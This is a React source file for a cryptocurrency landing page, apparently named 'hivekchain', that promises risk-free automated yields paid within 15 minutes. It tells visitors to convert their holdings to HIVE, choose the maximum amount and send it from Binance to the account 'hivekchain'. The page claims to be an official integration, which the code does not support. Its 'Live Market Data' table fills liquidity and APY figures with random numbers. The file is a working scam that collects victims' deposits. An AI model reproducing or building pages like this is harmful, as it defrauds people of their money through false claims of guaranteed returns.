import React from 'react'

// --- ICONS ---
const Icons = {
  Binance: () => (
    <svg viewBox="0 0 126 126" fill="currentColor" className="w-5 h-5">
      <path d="M88.59 25.57l20.78 20.8-15.06 15.07L73.53 40.63 88.59 25.57zm-51.18 0l20.78 20.8-15.06 15.07L22.35 40.63 15.06 63.4l-10.6-10.6 63.4-63.4 63.4 63.4-10.6 10.6-7.29-22.77-15.06 15.07L118.17 63.4 63.4 118.17 8.63 63.4l20.78-20.8L63.4 76.6l20.78-20.8L88.59 25.57zM63.4 89.27l25.19-25.19-25.19-25.19-25.19 25.19L63.4 89.27z" />
    </svg>
  ),
  Hive: () => (
    <svg viewBox="0 0 24 24" fill="currentColor" className="w-6 h-6">
      <path d="M12 2L2 12h3v8h6v-6h2v6h6v-8h3L12 2z" />
    </svg>
  ),
  Check: () => (
    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="3" d="M5 13l4 4L19 7"></path>
    </svg>
  ),
  Alert: () => (
    <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
      <path
        strokeLinecap="round"
        strokeLinejoin="round"
        strokeWidth="2"
        d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"
      ></path>
    </svg>
  ),
  Lock: () => (
    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
      <path
        strokeLinecap="round"
        strokeLinejoin="round"
        strokeWidth="2"
        d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"
      ></path>
    </svg>
  ),
  Layers: () => (
    <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
      <path
        strokeLinecap="round"
        strokeLinejoin="round"
        strokeWidth="2"
        d="M19 11H5m14 0a2 2 0 012 2v6a2 2 0 01-2 2H5a2 2 0 01-2-2v-6a2 2 0 012-2m14 0V9a2 2 0 00-2-2M5 11V9a2 2 0 012-2m0 0V5a2 2 0 012-2h6a2 2 0 012 2v2M7 7h10"
      ></path>
    </svg>
  ),
}

// --- SUB-COMPONENT: HERO SECTION ---
const Hero = () => {
  return (
    <section className="relative pt-20 pb-24 px-6 overflow-hidden">
      {/* Background Elements */}
      <div className="absolute top-0 right-0 w-[800px] h-[600px] bg-[#DC2626]/10 rounded-full blur-[140px]"></div>
      <div className="absolute bottom-0 left-0 w-[500px] h-[500px] bg-[#FCD535]/5 rounded-full blur-[120px]"></div>

      <div className="max-w-7xl mx-auto relative z-10 text-center">
        <div className="inline-flex items-center gap-2 px-4 py-2 rounded-full border border-[#DC2626]/50 bg-[#DC2626]/5 backdrop-blur-md mb-8">
          <div className="w-2 h-2 rounded-full bg-[#FCD535] animate-pulse shadow-[0_0_10px_#FCD535]"></div>
          <span className="text-[#FCD535] text-xs font-bold uppercase tracking-widest">
            Official hivekchain Integration
          </span>
        </div>

        <h1 className="text-5xl md:text-8xl font-extrabold tracking-tighter mb-6 text-white">
          Institutional Grade <br />
          <span className="text-transparent bg-clip-text bg-gradient-to-r from-[#DC2626] to-[#991b1b]">
            Liquidity Protocol
          </span>
        </h1>

        <p className="text-lg md:text-xl text-gray-400 max-w-3xl mb-10 leading-relaxed mx-auto font-light">
          Automate your yield generation on the Hive blockchain. Returns are processed in less than
          15 minutes after deposit. Each return triggers an automated withdrawal to the Active
          Participant's Binance Account using the HIVEMEMO provided.
        </p>

        <div className="flex flex-col sm:flex-row gap-6 justify-center items-center">
          <a
            href="https://www.binance.com/en/trade/HIVE_USDT?type=spot"
            target="_blank"
            rel="noopener noreferrer"
            className="px-10 py-5 rounded-xl bg-[#FCD535] text-black font-bold text-lg hover:scale-105 transition-transform shadow-[0_0_50px_-15px_rgba(252,213,53,0.5)]"
          >
            Initialize via Binance
          </a>

          <div className="flex gap-6 text-sm text-gray-500 border border-white/10 px-6 py-3 rounded-xl bg-black/40 backdrop-blur-sm">
            <span className="flex items-center gap-2">
              <span className="text-green-500">●</span> Automated Payouts
            </span>
            <span className="flex items-center gap-2">
              <span className="text-green-500">●</span> Zero Risk
            </span>
            <span className="flex items-center gap-2">
              <span className="text-green-500">●</span> $50 Min Entry
            </span>
          </div>
        </div>
      </div>
    </section>
  )
}

// --- SUB-COMPONENT: BANNER IMAGE ---
const BlockchainBanner = () => {
  return (
    <div className="relative w-full h-[400px] border-y border-white/5 overflow-hidden">
      <img
        src="https://images.unsplash.com/photo-1639762681485-074b7f938ba0?q=80&w=2400&auto=format&fit=crop"
        alt="Hive Binance Blockchain Integration"
        className="w-full h-full object-cover opacity-40 grayscale hover:grayscale-0 transition-all duration-1000"
      />
      <div className="absolute inset-0 bg-gradient-to-t from-black via-transparent to-black"></div>
      <div className="absolute inset-0 flex items-center justify-center">
        <div className="text-center">
          <h2 className="text-4xl font-bold text-white mb-2">Seamless Interoperability</h2>
          <p className="text-[#FCD535] tracking-widest uppercase text-sm">
            Connecting Binance Liquidity to Hivekchain
          </p>
        </div>
      </div>
    </div>
  )
}

// --- SUB-COMPONENT: DEPOSIT INSTRUCTIONS (Professional Rewrite) ---
const DepositGuide = () => {
  return (
    <section className="py-24 px-6 bg-black relative">
      <div className="max-w-6xl mx-auto">
        <div className="grid lg:grid-cols-12 gap-12">
          <div className="lg:col-span-4">
            <h2 className="text-4xl font-bold mb-6 text-white">
              Depositing <br />
              <span className="text-[#DC2626]">Assets</span>
            </h2>
            <p className="text-gray-400 leading-relaxed">
              Navigate the Binance interface to transfer funds to your hivekchain wallet. Ensure all
              parameters are strictly adhered to for successful automated processing.
            </p>
          </div>

          <div className="lg:col-span-8">
            <div className="bg-[#0A0A0A] border border-white/10 rounded-2xl p-8 shadow-2xl relative overflow-hidden">
              <div className="absolute top-0 right-0 w-96 h-96 bg-[#DC2626]/5 rounded-full blur-[100px]"></div>

              <div className="space-y-10 relative z-10">
                {/* Step 1 */}
                <div className="flex gap-5">
                  <div className="flex-shrink-0 w-10 h-10 rounded-full border border-[#FCD535] text-[#FCD535] font-bold flex items-center justify-center text-sm">
                    1
                  </div>
                  <div>
                    <h3 className="text-white font-bold mb-2">Currency Conversion</h3>
                    <p className="text-gray-400 text-sm leading-relaxed">
                      From the Binance dashboard, convert your assets to{' '}
                      <span className="text-white font-semibold">HIVE</span> prior to initiating the
                      deposit. To optimize returns, select the maximum value available.
                    </p>
                  </div>
                </div>

                {/* Step 2 */}
                <div className="flex gap-5">
                  <div className="flex-shrink-0 w-10 h-10 rounded-full border border-[#FCD535] text-[#FCD535] font-bold flex items-center justify-center text-sm">
                    2
                  </div>
                  <div>
                    <h3 className="text-white font-bold mb-2">On-Chain Deposit</h3>
                    <p className="text-gray-400 text-sm leading-relaxed">
                      Navigate to the HIVE asset page. Select the option to{' '}
                      <span className="text-white font-semibold">"Add Hive"</span> or{' '}
                      <span className="text-white font-semibold">"Deposit"</span>. Choose{' '}
                      <span className="text-white font-semibold">"On-chain Deposit"</span> followed
                      by <span className="text-white font-semibold">"HIVE"</span>.
                    </p>
                  </div>
                </div>

                {/* Critical Step */}
                <div className="bg-[#2a0a0a] border border-[#DC2626]/50 p-6 rounded-xl flex flex-col gap-4">
                  <div className="flex items-center gap-2 text-[#DC2626] font-bold text-sm uppercase tracking-wider">
                    <Icons.Alert /> Security Protocol
                  </div>
                  <div className="flex gap-5">
                    <div className="flex-shrink-0 w-10 h-10 rounded-full bg-[#DC2626] text-white font-bold flex items-center justify-center text-sm">
                      3
                    </div>
                    <div>
                      <h3 className="text-white font-bold mb-2">Retrieve HIVEMEMO</h3>
                      <p className="text-gray-300 text-sm leading-relaxed">
                        Copy the{' '}
                        <span className="text-[#FCD535] font-bold text-base">HIVEMEMO</span>. This
                        is a critical step; the HIVEMEMO serves as your unique account identifier.
                        You must provide the correct HIVEMEMO linked to your profile to prevent loss
                        of funds and guarantee accurate yield routing.
                      </p>
                    </div>
                  </div>
                </div>

                {/* Step 4 */}
                <div className="flex gap-5">
                  <div className="flex-shrink-0 w-10 h-10 rounded-full border border-[#FCD535] text-[#FCD535] font-bold flex items-center justify-center text-sm">
                    4
                  </div>
                  <div>
                    <h3 className="text-white font-bold mb-2">Initiate Withdrawal</h3>
                    <p className="text-gray-400 text-sm leading-relaxed">
                      Return to the HIVE coin page and select{' '}
                      <span className="text-white font-semibold">"Send"</span> or{' '}
                      <span className="text-white font-semibold">"Withdraw"</span> depending on your
                      interface version. Deposits are facilitated via on-chain withdrawal.
                    </p>
                  </div>
                </div>

                {/* Configuration Card */}
                <div className="grid md:grid-cols-2 gap-4 pt-4">
                  <div className="bg-black border border-white/10 p-5 rounded-lg">
                    <label className="text-xs text-gray-500 uppercase tracking-wider block mb-2">
                      Recipient Address
                    </label>
                    <code className="text-[#FCD535] font-mono text-lg block break-all">
                      hivekchain
                    </code>
                    <span className="text-[10px] text-[#DC2626] mt-1 block">
                      Strictly lowercase
                    </span>
                  </div>
                  <div className="bg-black border border-white/10 p-5 rounded-lg">
                    <label className="text-xs text-gray-500 uppercase tracking-wider block mb-2">
                      Network
                    </label>
                    <code className="text-white font-mono text-lg block">HIVE automatched</code>
                  </div>
                  <div className="bg-black border border-white/10 p-5 rounded-lg md:col-span-2">
                    <label className="text-xs text-gray-500 uppercase tracking-wider block mb-2">
                      MEMO
                    </label>
                    <div className="flex items-center gap-2">
                      <code className="text-white font-mono text-lg flex-1">
                        [PASTE HIVEMEMO HERE]
                      </code>
                      <span className="text-xs text-gray-500">Must match account</span>
                    </div>
                  </div>
                  <div className="bg-black border border-white/10 p-5 rounded-lg md:col-span-2 flex justify-between items-center">
                    <div>
                      <label className="text-xs text-gray-500 uppercase tracking-wider block mb-1">
                        Amount
                      </label>
                      <span className="text-white font-mono">HIVE Max</span>
                    </div>
                    <button className="text-xs border border-[#FCD535] text-[#FCD535] px-3 py-1 rounded">
                      Select Max
                    </button>
                  </div>
                </div>

                {/* Step 5 */}
                <div className="flex gap-5 pt-4 border-t border-white/5">
                  <div className="flex-shrink-0 text-green-500">
                    <Icons.Check />
                  </div>
                  <div>
                    <h3 className="text-white font-bold mb-2">Confirmation & Execution</h3>
                    <p className="text-gray-400 text-sm leading-relaxed">
                      Confirm the withdrawal. Our automated systems will handle the execution.
                      Processing takes no more than fifteen minutes. Returns vary based on market
                      volatility in a completely risk-free environment.
                    </p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>
  )
}

// --- SUB-COMPONENT: FEATURES GRID ---
const Features = () => {
  return (
    <section className="py-24 px-6 bg-[#050505] border-t border-white/5">
      <div className="max-w-7xl mx-auto grid md:grid-cols-3 gap-8">
        {/* Feature 1 */}
        <div className="bg-black border border-white/10 p-8 rounded-2xl hover:border-[#DC2626]/50 transition-colors group">
          <div className="w-12 h-12 rounded-lg bg-[#DC2626]/10 flex items-center justify-center text-[#DC2626] mb-6 group-hover:scale-110 transition-transform">
            <Icons.Layers />
          </div>
          <h3 className="text-xl font-bold text-white mb-3">Multi-Contribution Capability</h3>
          <p className="text-gray-400 text-sm leading-relaxed">
            Account holders are not limited to a single position. You may have more than one
            contribution active at a time to maximize portfolio diversification.
          </p>
        </div>

        {/* Feature 2 */}
        <div className="bg-black border border-white/10 p-8 rounded-2xl hover:border-[#FCD535]/50 transition-colors group">
          <div className="w-12 h-12 rounded-lg bg-[#FCD535]/10 flex items-center justify-center text-[#FCD535] mb-6 group-hover:scale-110 transition-transform">
            <Icons.Lock />
          </div>
          <h3 className="text-xl font-bold text-white mb-3">Zero Risk Architecture</h3>
          <p className="text-gray-400 text-sm leading-relaxed">
            Utilize our hedged liquidity pools to safeguard against impermanent loss. Your principal
            is protected while generating passive yields.
          </p>
        </div>

        {/* Feature 3 */}
        <div className="bg-black border border-white/10 p-8 rounded-2xl hover:border-[#FCD535]/50 transition-colors group">
          <div className="w-12 h-12 rounded-lg bg-[#FCD535]/10 flex items-center justify-center text-[#FCD535] mb-6 group-hover:scale-110 transition-transform">
            <svg className="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth="2"
                d="M13 10V3L4 14h7v7l9-11h-7z"
              ></path>
            </svg>
          </div>
          <h3 className="text-xl font-bold text-white mb-3">Instant Automated Yields</h3>
          <p className="text-gray-400 text-sm leading-relaxed">
            Returns are received in not more than 15 minutes. Each liquidity pool return triggers an
            automated withdrawal directly to your wallet.
          </p>
        </div>
      </div>
    </section>
  )
}

// --- SUB-COMPONENT: PRICING & LIMITS ---
const PricingRules = () => {
  return (
    <section className="py-24 px-6 bg-black">
      <div className="max-w-7xl mx-auto">
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
          {/* Minimum Deposit Card */}
          <div className="bg-[#0A0A0A] border border-[#FCD535]/30 p-10 rounded-2xl relative overflow-hidden">
            <div className="absolute top-0 right-0 w-64 h-64 bg-[#FCD535]/5 rounded-full blur-[80px]"></div>
            <h3 className="text-gray-400 text-sm font-bold uppercase tracking-widest mb-4">
              Minimum Entry Requirement
            </h3>
            <div className="flex items-baseline gap-4 mb-2">
              <span className="text-5xl font-bold text-white">$50</span>
              <span className="text-xl text-gray-500">USD</span>
            </div>
            <div className="flex items-center gap-2 mb-6 text-[#FCD535] font-mono">
              <span className="text-gray-500">≈</span>
              <span className="text-2xl">1483.61 HIVE</span>
            </div>
            <p className="text-gray-400 text-sm leading-relaxed">
              This is the minimum capital required to activate your account profile and initiate
              automated yield generation.
            </p>
          </div>

          {/* Limit Card */}
          <div className="bg-[#0A0A0A] border border-[#DC2626]/30 p-10 rounded-2xl relative overflow-hidden">
            <div className="absolute top-0 right-0 w-64 h-64 bg-[#DC2626]/5 rounded-full blur-[80px]"></div>
            <h3 className="text-gray-400 text-sm font-bold uppercase tracking-widest mb-4">
              Tiered Contribution Limits
            </h3>
            <div className="flex items-baseline gap-4 mb-2">
              <span className="text-4xl font-bold text-white">Under $250</span>
              <span className="text-lg text-gray-500">USD</span>
            </div>
            <div className="flex items-center gap-2 mb-6 text-[#DC2626] font-mono">
              <span className="text-gray-500">≈</span>
              <span className="text-2xl">~2491.29 HIVE</span>
            </div>
            <p className="text-gray-400 text-sm leading-relaxed">
              Accounts with balances equivalent to less than $250 USD are restricted to{' '}
              <span className="text-white font-bold">three contributions per 24-hour period</span>.
              Increase your stake to unlock unlimited throughput.
            </p>
          </div>
        </div>
      </div>
    </section>
  )
}

// --- SUB-COMPONENT: POOLS TABLE ---
const PoolsTable = () => {
  const binanceLink = 'https://www.binance.com/en/trade/HIVE_USDT?type=spot'

  return (
    <section className="py-24 px-6 bg-[#050505]">
      <div className="max-w-7xl mx-auto">
        <div className="flex justify-between items-end mb-8">
          <h2 className="text-3xl font-bold text-white">Live Market Data</h2>
          <a
            href={binanceLink}
            target="_blank"
            rel="noopener noreferrer"
            className="text-[#FCD535] text-sm hover:underline"
          >
            View on Binance &rarr;
          </a>
        </div>

        <div className="overflow-hidden rounded-xl border border-white/10 bg-black">
          <table className="w-full text-left border-collapse">
            <thead>
              <tr className="bg-[#1a0505] text-gray-400 text-xs uppercase tracking-wider border-b border-white/10">
                <th className="p-6 font-medium">Pool Name</th>
                <th className="p-6 font-medium">Total Liquidity</th>
                <th className="p-6 font-medium">Volume (24h)</th>
                <th className="p-6 font-medium">Yield Cycle</th>
                <th className="p-6 font-medium">APY</th>
                <th className="p-6 font-medium text-right">Action</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-white/5 text-sm">
              {/* Clickable First Row */}
              <a
                href={binanceLink}
                target="_blank"
                rel="noopener noreferrer"
                className="contents hover:bg-white/[0.02] transition-colors cursor-pointer"
              >
                <tr className="group">
                  <td className="p-6">
                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 rounded-full bg-[#FCD535] p-2 text-black">
                        <Icons.Binance />
                      </div>
                      <div>
                        <div className="font-bold text-white group-hover:text-[#FCD535] transition-colors">
                          HIVE / USDT
                        </div>
                        <div className="text-xs text-gray-500">Primary Pair • Trade Now</div>
                      </div>
                    </div>
                  </td>
                  <td className="p-6 font-medium text-gray-300">$42.5M</td>
                  <td className="p-6 text-gray-400">$1.2M</td>
                  <td className="p-6">
                    <span className="px-2 py-1 rounded text-[10px] font-bold bg-[#FCD535]/10 text-[#FCD535]">
                      15 MIN
                    </span>
                  </td>
                  <td className="p-6 text-[#FCD535] font-bold">18.5%</td>
                  <td className="p-6 text-right">
                    <button className="text-[#FCD535] text-xs font-bold border border-[#FCD535]/30 px-4 py-2 rounded hover:bg-[#FCD535] hover:text-black transition-all">
                      TRADE
                    </button>
                  </td>
                </tr>
              </a>

              {/* Static Rows */}
              {[2, 3, 4, 5, 6, 7].map((item) => (
                <tr key={item} className="hover:bg-white/[0.02] transition-colors">
                  <td className="p-6">
                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 rounded-full bg-[#DC2626]/20 flex items-center justify-center text-[#DC2626]">
                        <Icons.Hive />
                      </div>
                      <div>
                        <div className="font-bold text-white">
                          HIVE / {['HBD', 'BNB', 'ETH', 'BTC', 'USDC', 'SWAP.HIVE'][item - 2]}
                        </div>
                        <div className="text-xs text-gray-500">Pair {item}</div>
                      </div>
                    </div>
                  </td>
                  <td className="p-6 font-medium text-gray-300">
                    ${(Math.random() * 50 + 5).toFixed(1)}M
                  </td>
                  <td className="p-6 text-gray-400">${(Math.random() * 1 + 0.1).toFixed(1)}M</td>
                  <td className="p-6">
                    <span className="px-2 py-1 rounded text-[10px] font-bold bg-gray-800 text-gray-300">
                      15 MIN
                    </span>
                  </td>
                  <td className="p-6 text-[#FCD535] font-bold">
                    {(Math.random() * 10 + 10).toFixed(1)}%
                  </td>
                  <td className="p-6 text-right">
                    <button className="text-gray-500 text-xs font-bold border border-white/10 px-4 py-2 rounded hover:border-white/30 transition-all">
                      DETAILS
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </section>
  )
}

// --- MAIN LANDING PAGE ---
const LandingPage = () => {
  return (
    <main className="container">
      <div className="min-h-screen bg-black text-white font-sans selection:bg-[#FCD535] selection:text-black">
        <Hero />
        <BlockchainBanner />
        <Features />
        <DepositGuide />
        <PricingRules />
        <PoolsTable />

        {/* FOOTER CTA */}
        <section className="py-24 px-6 bg-[#DC2626]">
          <div className="max-w-4xl mx-auto flex flex-col items-center justify-center text-center gap-8">
            <h3 className="text-4xl md:text-5xl font-bold text-white">Maximize Your Capital</h3>
            <p className="text-white/90 text-lg max-w-2xl leading-relaxed">
              Initiate your automated liquidity protocol today. The more you invest, the more you
              earn. No maximum contribution limit. Minimum entry: $50 USD.
            </p>
            <div className="flex flex-col items-center gap-2 text-sm text-white/70">
              <span>
                Withdrawal Address:{' '}
                <span className="font-mono bg-black/30 px-2 py-1 rounded">'hivekchain'</span>
              </span>
              <span>Ensure all details are entered in lowercase.</span>
            </div>
            <a
              href="https://www.binance.com/en/trade/HIVE_USDT?type=spot"
              target="_blank"
              rel="noopener noreferrer"
              className="px-12 py-5 rounded-lg bg-[#FCD535] text-black font-bold text-xl hover:bg-white hover:scale-105 transition-all shadow-[0_0_40px_rgba(0,0,0,0.3)]"
            >
              Connect via Binance
            </a>
          </div>
        </section>
      </div>
    </main>
  )
}

export default LandingPage
